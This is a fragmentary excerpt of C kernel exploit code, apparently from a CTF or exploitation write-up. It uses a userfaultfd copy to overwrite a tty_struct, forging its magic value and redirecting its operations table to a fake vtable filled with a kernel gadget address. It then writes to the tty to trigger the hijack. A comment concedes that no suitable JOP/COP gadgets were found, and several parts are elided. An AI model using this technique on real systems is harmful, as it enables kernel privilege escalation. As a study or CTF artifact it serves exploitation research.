...
void* write_handler(void *arg)
{
	...
	struct uffdio_copy uc;
	//set buffer
	tty[0] = 0x000000100005401;
	tty[2] =  heap_base-0x30; 
	tty[3] = heap_base+0x100;//hijack vtable to ptmx_base+0x100
	for(int i=0;i<0x10;i++){
		tty[0x100/8+i] = kernel_base + 0x1267d;//hijack control flow to JOP/COP,but no suitable gadgets found
	}
	printf("Hijack control flow to :%lx\n",kernel_base+0x1267d);
	uc.src = (uintptr_t)tty;
...
int main(int argc, char const *argv[]){
	...
	debug();
	char* tmp = (char*)malloc(0x20);
	write(ttyfd,tmp,0x20);
	return 0;	
}
